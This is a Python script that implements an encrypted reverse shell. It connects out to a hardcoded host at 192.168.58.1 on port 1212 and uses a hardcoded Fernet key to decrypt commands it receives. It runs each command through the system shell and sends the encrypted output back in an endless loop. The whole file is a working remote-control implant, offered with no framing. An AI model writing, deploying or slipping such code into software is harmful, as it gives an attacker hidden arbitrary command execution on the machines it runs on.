import socket
import subprocess
from cryptography.fernet import Fernet

key = b'6wifEyjwf89CwkUweVRcBMxU7ywgba3ayNRAm_0Gq9E='
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.58.1", 1212))

def encrypt(msg,key):
    ferObject = Fernet(key)
    msgEncrypt = ferObject.encrypt(msg)
    return msgEncrypt

def decrypt(msg,key):
    ferObject = Fernet(key)
    msgDecrypt = ferObject.decrypt(msg)
    return msgDecrypt


def cmd(command):
    p = subprocess.Popen(command.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return p.stdout.read().decode(errors='replace').strip()

def sendMsg(msg):
    msg = encrypt(msg,key)
    header = str(len(msg)).encode() #to send to the client the current length of the message
    s.send(header)
    s.send(msg) #sending the real message

def readMsg():
    header = s.recv(5)
    msg = s.recv(int(header.decode()))
    return decrypt(msg,key).decode()

while True:
    command = readMsg()
    out = cmd(command)
    sendMsg(out.encode())
    
